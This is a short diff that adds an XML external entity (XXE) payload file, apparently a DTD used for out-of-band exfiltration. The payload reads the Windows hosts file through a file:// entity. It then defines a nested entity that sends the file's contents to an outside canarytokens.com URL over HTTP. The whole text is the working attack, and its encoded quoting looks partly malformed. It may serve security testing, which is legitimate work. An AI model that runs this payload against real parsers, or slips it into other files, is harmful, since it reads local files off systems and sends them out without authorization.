@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://2wnmgq1exl4pr7rm81etrrnui.canarytokens.com/?x=%file;%27%3E%22%3E
+%eval;
+%exfil;
